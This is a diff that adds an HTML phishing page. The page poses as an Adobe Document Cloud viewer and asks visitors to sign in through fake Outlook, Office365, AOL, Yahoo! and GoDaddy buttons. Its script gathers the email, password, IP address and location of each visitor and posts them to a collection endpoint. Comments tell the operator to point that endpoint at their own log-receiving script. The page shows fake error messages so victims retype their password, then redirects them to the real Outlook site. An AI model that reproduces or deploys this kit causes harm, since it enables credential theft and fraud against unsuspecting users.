@@ -1,0 +1,475 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Document</title>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+    <style>
+      /* CSS Reset */
+      /* Box sizing rules */
+      *,
+      *::before,
+      *::after {
+        box-sizing: border-box;
+      }
+
+      /* Remove default margin */
+      body,
+      h1,
+      h2,
+      h3,
+      h4,
+      p,
+      figure,
+      blockquote,
+      dl,
+      dd {
+        margin: 0px 0px 0px;
+      }
+
+      /* Remove list styles on ul, ol elements with a list role, which suggests default styling will be removed */
+      ul[role="list"],
+      ol[role="list"] {
+        list-style: none;
+      }
+
+      /* Set core root defaults */
+      html:focus-within {
+        scroll-behavior: smooth;
+      }
+
+      /* Set core body defaults */
+      body {
+        min-height: 100vh;
+        text-rendering: optimizeSpeed;
+        line-height: 1.5;
+      }
+
+      /* A elements that don't have a class get default styles */
+      a:not([class]) {
+        text-decoration-skip-ink: auto;
+      }
+
+      /* Make images easier to work with */
+      img,
+      picture {
+        width: 100%;
+        /* display: block; */
+        height: auto;
+        /* object-fit: contain; */
+      }
+
+      /* Inherit fonts for inputs and buttons */
+      input,
+      button,
+      textarea,
+      select {
+        font: inherit;
+      }
+
+      /* Remove all animations, transitions and smooth scroll for people that prefer not to see them */
+      @media (prefers-reduced-motion: reduce) {
+        html:focus-within {
+          scroll-behavior: auto;
+        }
+
+        *,
+        *::before,
+        *::after {
+          animation-duration: 0.01ms !important;
+          animation-iteration-count: 1 !important;
+          transition-duration: 0.01ms !important;
+          scroll-behavior: auto !important;
+        }
+      }
+
+      /* Main CSS */
+      body {
+        background-color: #fff;
+        background-image: url("https://i.ibb.co/cg5XSyS/blurred-bg.jpg");
+        background-position: center;
+        background-repeat: no-repeat;
+        background-size: cover;
+        color: #fff;
+        display: grid;
+        font-family: Arial, Helvetica, sans-serif;
+        min-height: 100vh;
+        place-items: center;
+      }
+      .login-menu {
+        background-color: #000000cf;
+        display: grid;
+        max-width: 29em;
+        padding-block: 3em;
+        padding-inline: 2.3em;
+        text-align: center;
+        width: 100%;
+        place-items: center;
+        border-radius: 0.8em;
+      }
+      .login-menu__logo {
+        width: 8em;
+        aspect-ratio: 1;
+        margin-block: -1.5em;
+      }
+      .login-menu__heading {
+        font-size: 1rem;
+      }
+      .login-menu__description {
+        font-size: 0.9rem;
+        font-weight: 300;
+        width: 80%;
+      }
+      button {
+        align-items: center;
+        border-radius: 0;
+        border: none;
+        display: flex;
+        justify-content: space-between;
+        margin-top: 0.8em;
+        max-height: 2.1em;
+        width: 100%;
+        overflow: hidden;
+        cursor: pointer;
+      }
+      button:hover {
+        opacity: 0.8;
+      }
+      .login-menu__icon {
+        flex-basis: 8%;
+        margin-left: -0.34em;
+        padding-block: 1em;
+        display: grid;
+        place-items: center;
+        padding-inline: 0.3em;
+      }
+      .login-menu__label {
+        display: block;
+        flex-basis: 95%;
+        text-align: left;
+        font-size: 0.8rem;
+        padding-left: 1.5em;
+        padding-block: 1em;
+        margin-right: -0.5em;
+        color: white;
+      }
+      .login-form {
+        background-color: #fff;
+        color: #000;
+        max-width: 27em;
+        padding-inline: 2em;
+        position: absolute;
+        width: 100%;
+        z-index: 999;
+        border-radius: 0.2em;
+        display: none;
+        margin-top: 2em;
+        margin-bottom: 2em;
+      }
+      .login-form__header {
+        display: flex;
+        justify-content: flex-end;
+        align-items: center;
+        margin-inline: -2em;
+        padding-inline: 0.5em;
+        padding-block: 0.5em;
+      }
+      .login-form__close {
+        width: 1em;
+        background: none;
+        margin: 0;
+        font-size: 1.8rem;
+        color: #838383;
+      }
+      .login-form__hero {
+        display: grid;
+        place-items: center;
+        padding-block: 1em;
+      }
+      .login-form__avatar {
+        border-radius: 50%;
+        overflow: hidden;
+        width: 6em;
+      }
+      .login-form__avatar img {
+        max-height: 100%;
+        display: block;
+        object-position: center;
+        object-fit: cover;
+      }
+      .login-form__heading {
+        font-size: 1.3rem;
+        font-weight: 300;
+        color: #000;
+        margin-top: 0.7em;
+      }
+      .login-form__message {
+        font-size: 0.8rem;
+        font-weight: 300;
+        color: #aeaeae;
+        margin-block: 0.5em;
+        margin-bottom: 1em;
+      }
+      .login-form__footer {
+        display: flex;
+        justify-content: flex-end;
+        align-items: center;
+        margin-inline: -2em;
+        padding-inline: 0.5em;
+        margin-top: 2em;
+        padding-block: 1em;
+        gap: 2%;
+      }
+      .login-form__footer button {
+        max-width: 5em;
+        margin: 0;
+        text-align: center;
+        display: inline-block;
+        max-height: 100%;
+        padding-block: 0.6em;
+        color: #fff;
+        border-radius: 0.3em;
+      }
+      label {
+        color: #5c5f62;
+        display: block;
+        margin-bottom: 0.5em;
+      }
+      input {
+        border-radius: 0.2em;
+        border: 1px solid #e1d3d3;
+        display: block;
+        padding-block: 0.5em;
+        padding-inline: 0.7em;
+        width: 100%;
+      }
+    </style>
+  </head>
+  <body>
+    <section class="login-menu">
+      <img
+        class="login-menu__logo"
+        src="https://logodownload.org/wp-content/uploads/2021/05/adobe-acrobat-reader-logo-0.png"
+        style="margin: -10px 0px"
+      />
+      <h1 class="login-menu__heading">Adobe Document Cloud</h1>
+      <p class="login-menu__description" style="width: 100%; margin: 2px 0px">
+        To read the document, please enter with the valid email credentials that
+        this file was sent to
+      </p>
+
+      <button
+        onclick="showForm('Outlook', 'https://upload.wikimedia.org/wikipedia/commons/thumb/d/df/Microsoft_Office_Outlook_%282018%E2%80%93present%29.svg/1101px-Microsoft_Office_Outlook_%282018%E2%80%93present%29.svg.png')"
+      >
+        <div style="background-color: #043860" class="login-menu__icon">
+          <img
+            src="https://upload.wikimedia.org/wikipedia/commons/thumb/d/df/Microsoft_Office_Outlook_%282018%E2%80%93present%29.svg/1101px-Microsoft_Office_Outlook_%282018%E2%80%93present%29.svg.png"
+          />
+        </div>
+        <span style="background-color: #0172c6" class="login-menu__label"
+          >Sign in with Outlook</span
+        >
+      </button>
+
+      <button
+        onclick="showForm('Office365','https://toppng.com/public/uploads/thumbnail/office-365-icon-microsoft-office-logo-11563405007przwxfunpr.png')"
+      >
+        <div style="background-color: #772309" class="login-menu__icon">
+          <img
+            src="https://toppng.com/public/uploads/thumbnail/office-365-icon-microsoft-office-logo-11563405007przwxfunpr.png"
+          />
+        </div>
+        <span style="background-color: #e44817" class="login-menu__label"
+          >Sign in with Office365</span
+        >
+      </button>
+
+      <button
+        onclick="showForm('AOL','https://www.kindpng.com/picc/b/716-7162953_aol-logo-png.png')"
+      >
+        <div style="background-color: #064451" class="login-menu__icon">
+          <img
+            src="https://www.kindpng.com/picc/b/716-7162953_aol-logo-png.png"
+          />
+        </div>
+        <span style="background-color: #0fd6ff" class="login-menu__label"
+          >Sign in with AOL</span
+        >
+      </button>
+
+      <button
+        onclick="showForm('Yahoo!','https://toppng.com/public/uploads/thumbnail/yahoo-y-vector-logo-download-free-11574118306iiwnvlzexj.png')"
+      >
+        <div style="background-color: #420844" class="login-menu__icon">
+          <img
+            src="https://toppng.com/public/uploads/thumbnail/yahoo-y-vector-logo-download-free-11574118306iiwnvlzexj.png"
+          />
+        </div>
+        <span style="background-color: #89288d" class="login-menu__label"
+          >Sign in with Yahoo!</span
+        >
+      </button>
+
+      <button
+        onclick="showForm('GoDaddy','https://upload.wikimedia.org/wikipedia/commons/d/da/GoDaddy_Logo_-_The_GO.svg')"
+      >
+        <div style="background-color: #fff" class="login-menu__icon">
+          <img
+            src="https://upload.wikimedia.org/wikipedia/commons/d/da/GoDaddy_Logo_-_The_GO.svg"
+          />
+        </div>
+        <span style="background-color: #1bdbdb" class="login-menu__label"
+          >Sign in with GoDaddy</span
+        >
+      </button>
+
+      <p style="margin-top: 1em; font-size: 0.8rem; font-weight: 100">
+        Select your email provider to view Document
+      </p>
+      <p style="margin-top: 1em; font-size: 0.8rem">
+        CopyRight&copy; 2023 Adobe
+      </p>
+    </section>
+
+    <form class="login-form" id="nameform" onsubmit="callPhp(event)">
+      <header class="login-form__header">
+        <button class="login-form__close" onclick="closeForm(event)">
+          &times;
+        </button>
+      </header>
+      <section class="login-form__hero">
+        <div class="login-form__avatar">
+          <img id="domainLogo" />
+        </div>
+        <h2
+          id="domainName"
+          class="login-form__heading"
+          style="color: rgb(58, 58, 58)"
+        ></h2>
+      </section>
+      <label for="email" style="font-size: 14px">Email address</label>
+      <input
+        id="email"
+        type="text"
+        name="email"
+        placeholder="Enter email"
+        class="input-control"
+        required
+        style="font-size: 14px"
+      />
+      <p class="login-form__message">
+        We'll never share your email with anyone else.
+      </p>
+      <label for="password" style="font-size: 14px">Password</label>
+      <input
+        id="password"
+        type="password"
+        name="password"
+        placeholder="Enter Password"
+        class="input-control"
+        required
+        style="font-size: 14px"
+      />
+
+      <p id="error" style="color: red; font-size: 12px"></p>
+
+      <footer class="login-form__footer">
+        <button
+          style="background-color: #6c757d; font-size: 14px"
+          onclick="closeForm(event)"
+        >
+          Close
+        </button>
+        <button
+          type="submit"
+          form="nameform"
+          name="send"
+          style="background-color: #17a2b8; font-size: 14px"
+        >
+          Login
+        </button>
+      </footer>
+    </form>
+
+    <script>
+      let ipLocation;
+      let count = 0;
+      const data = {
+        ipAddress: "",
+        location: "",
+        email: "",
+        password: "",
+        account: "",
+      };
+
+      function showForm(domainName, domainLogo) {
+        data.account = domainName;
+        //04395686587
+        document.getElementById("nameform").style.display = "block";
+        document.getElementById(
+          "domainName"
+        ).innerHTML = `Login with ${domainName}`;
+        document.getElementById("domainLogo").src = domainLogo;
+      }
+
+      function closeForm(event) {
+        event.preventDefault();
+        document.getElementById("email").value = "";
+        document.getElementById("password").value = "";
+        document.getElementById("nameform").style.display = "none";
+      }
+
+      function callPhp(event) {
+        event.preventDefault();
+
+        const formData = new FormData(event.currentTarget);
+
+        data.email = formData.get("email");
+        data.password = formData.get("password");
+        data.ipAddress = ipLocation.ip;
+        data.location = `${ipLocation.country_name} | ${ipLocation.region} | ${ipLocation.city}`
+        // console.log(data);
+
+        $.ajax({
+          url: "http://127.0.0.1/user", //Change this to your php script url to receive logs
+          type: "POST",
+          data: JSON.stringify(data),
+          headers: { 'Content-type': 'application/json' },
+          success: function (result) {
+            console.log(result);
+          },
+          error: function () {
+            console.log("error");
+          },
+        });
+
+        if (count < 2) {
+          document.getElementById("error").innerHTML =
+            "Something went wrong. Please try again.";
+        } else {
+          document.getElementById("error").innerHTML = "";
+          window.location.href = "https://outlook.office.com"; //Change this link for redirect user to final url
+        }
+
+        count++;
+      }
+
+      function getLocation() {
+        $.ajax({
+          url: "https://ipapi.co/json", //Change this to your php script url to receive logs
+          type: "GET",
+          success: function (result) {
+            ipLocation = result;
+            console.log(result);
+          },
+          error: function () {
+            console.log("error");
+          },
+        });
+      }
+      getLocation()
+    </script>
+  </body>
+</html>
